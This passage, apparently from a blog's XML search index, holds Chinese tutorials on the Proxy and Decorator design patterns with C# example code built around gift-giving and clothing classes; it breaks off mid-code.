keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你洋娃娃"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你鲜花"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你巧克力"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>代理者</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//代理者实现接口</span>    <span class="token keyword">class</span> <span class="token class-name">Proxy</span> <span class="token punctuation">:</span> GiveGift    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//声明一个雇主变量，用来存储聘用代理者的雇主对象</span>        Pursuit gg<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Proxy</span><span class="token punctuation">(</span>SchoolGirl mm<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//建立追求者与本追求者之间的关系</span>            gg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pursuit</span><span class="token punctuation">(</span>mm<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用雇主对象自身的方法</span>            gg<span class="token punctuation">.</span><span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            gg<span class="token punctuation">.</span><span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            gg<span class="token punctuation">.</span><span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            SchoolGirl jiaojiao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SchoolGirl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jiaojiao<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">"李娇娇"</span><span class="token punctuation">;</span>            Proxy daili <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>jiaojiao<span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>注</strong>：</p><ul><li>代理使用的方法实际是雇主实现的方法</li><li>代理维护一个与雇主相关的对象</li><li>雇主维护一个与追求者相关的对象</li></ul><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>1).    <strong>远程代理</strong>：也就是为对象在不同的地址空间提供局部代表。这样可以隐藏一个对象存在于不同地址空间的事实。<br>2).    <strong>虚拟代理</strong>：是根据需要创建开销很大的对象。通过它来存放实例化需要很长时间的真是对象。<br>3).    <strong>安全代理</strong>：用来控制真实对象访问时的权限。<br>4).    <strong>智能指引</strong>：是指当调用真实的对象时，代理处理另外一些事。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《大话设计模式》</li><li>《设计模式精解及面试攻略》</li></ul><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 代理模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            SchoolGirl jiaojiao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SchoolGirl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jiaojiao<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">"李娇娇"</span><span class="token punctuation">;</span>            Proxy daili <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>jiaojiao<span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//送礼物的接口</span>    <span class="token keyword">interface</span> <span class="token class-name">GiveGift</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//代理者实现接口</span>    <span class="token keyword">class</span> <span class="token class-name">Proxy</span> <span class="token punctuation">:</span> GiveGift    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//声明一个雇主变量，用来存储聘用代理者的雇主对象</span>        Pursuit gg<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Proxy</span><span class="token punctuation">(</span>SchoolGirl mm<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//建立追求者与本追求者之间的关系</span>            gg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pursuit</span><span class="token punctuation">(</span>mm<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用雇主对象自身的方法</span>            gg<span class="token punctuation">.</span><span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            gg<span class="token punctuation">.</span><span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            gg<span class="token punctuation">.</span><span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//追求者---（雇主）</span>    <span class="token keyword">class</span> <span class="token class-name">Pursuit</span> <span class="token punctuation">:</span> GiveGift    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//雇主心意的女孩对象</span>        SchoolGirl mm<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Pursuit</span><span class="token punctuation">(</span>SchoolGirl mm<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//追求者与被追求者之间的联系</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mm <span class="token operator">=</span> mm<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你洋娃娃"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你鲜花"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你巧克力"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//被追求者</span>    <span class="token keyword">class</span> <span class="token class-name">SchoolGirl</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 代理模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>装饰模式</title>
      <link href="/2020/08/22/zhuang-shi-mo-shi/"/>
      <url>/2020/08/22/zhuang-shi-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        装饰模式，动态地给一个对象添加一些额外的职责，就添加功能来说，装饰模式比生成子类更为灵活。</p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><p><strong>抽象组件(Component)</strong>：</p><p>​        定义一个对象接口，可以给这些对象动态地添加职责。</p></li><li><p><strong>具体组件(ConcreteComponent)</strong>：</p><p>​        定义一个实现组件接口的对象。这是实际需要加以装饰的对象，但其对装饰的过程一无所知。</p></li><li><p><strong>装饰器(Decorator)</strong>：</p><p>​        维护对组件对象的引用，并定义了与组件对象形式一致的接口。</p></li><li><p><strong>具体装饰器(ConcreteDecorator)</strong>：</p><p>​        实际上由其负责为抽象组件添加功能。它是从装饰器继承的类，并通过以新的公共方法的形式来添加一些额外的特定功能。</p></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>创建原始的抽象组件和装饰器之间的继承关系；</li><li>在装饰器类中，将抽象组件作为一个字段添加；</li><li>将抽象组件传递到装饰器的构造函数中，并初始化抽象组件对象；</li><li>在装饰器类中，重定向所有抽象组件的方法到抽象组件对象；</li><li>在具体装饰器类中，重写所有抽象组件中需要扩展或修改的方法。</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/装饰模式/装饰模式结构图.jpg" alt="装饰模式结构图"></center><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p><strong>结构图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/装饰模式/装饰模式UML.jpg" alt="装饰模式UML"></center><p><strong>ConcreteComponent角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> Person类(ConcreteComponent)</span>    <span class="token keyword">class</span> <span class="token class-name">Person</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span> <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"装扮的{0}"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>Decorator角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 服饰类(Decorator)</span>    <span class="token keyword">class</span> <span class="token class-name">Finery</span> <span class="token punctuation">:</span> Person    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> Person component<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//打扮</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Decorate</span><span class="token punctuation">(</span>Person component<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>component <span class="token operator">=</span> component<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用的是父类中的方法</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>component <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                component<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>ConcreteDecorator角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体服饰类(ConcreteDecorator)</span>    <span class="token keyword">class</span> <span class="token class-name">TShirts</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"大T恤 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">BigTrouser</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"垮裤 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Sneakers</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"破球鞋 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Suit</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"西装 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Tie</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"领带 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">LeatherShoes</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"皮鞋 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Person xc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"小菜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第一种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Sneakers pqx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sneakers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BigTrouser kk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigTrouser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            TShirts dtx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TShirts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//装饰过程          ---里氏替换原则</span>            pqx<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//破球鞋装扮</span>            kk<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>pqx<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//跨库装扮</span>            dtx<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//大T衫装扮</span>            dtx<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//回调方法直至最底层</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第二种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LeatherShoes px <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeatherShoes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       Tie ld <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        Suit xz <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Suit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">//装饰过程</span>            px<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//皮鞋装扮 </span>            ld<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//领带装扮</span>            xz<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//西装装扮</span>            xz<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第三种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Sneakers pqx2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sneakers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LeatherShoes px2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeatherShoes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BigTrouser kk2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigTrouser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Tie ld2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//装饰过程</span>            pqx2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>            px2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>pqx<span class="token punctuation">)</span><span class="token punctuation">;</span>            kk2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>px2<span class="token punctuation">)</span><span class="token punctuation">;</span>            ld2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>kk2<span class="token punctuation">)</span><span class="token punctuation">;</span>            ld2<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/装饰模式/装饰模式测试结果展示.png" alt="装饰模式测试结果展示"></center><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p><strong>优点</strong>：</p><ul><li>扩展对象功能，比继承灵活，不会导致类个数的急剧增加</li><li>可以对一个对象进行多次装饰，创造出不同行为的组合，得到功能更加强大的对象。</li><li>具体构建类和具体装饰类可以独立变化，用户可以根据需要自己增加新的具体构建子类和具体装饰子类。</li></ul><p><strong>缺点</strong>：</p><ul><li>产生很多小对象。大量小对象占据内存，一定程度上影响性能。</li><li>装饰模式容易出错，调试排查比较麻烦。</li></ul><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><ol><li>IO中输入流和输出流的设计</li><li>Swing包中图形界面的构件功能</li><li>Servlet API中提供了一个request对象的Decorator设计模式的默认实现类HttpServletRequestWrapper, HttpServletRequestWrapper类，增强了request对象的功能。</li><li>Struts2 中，request，response，session对象的处理</li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《大话设计模式》</li><li>《设计模式精解及面试攻略》</li></ul><h2 id="完整测试代码"><a href="#完整测试代码" class="headerlink" title="完整测试代码"></a>完整测试代码</h2><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 装饰模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Person xc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"小菜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第一种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Sneakers pqx <span class="token 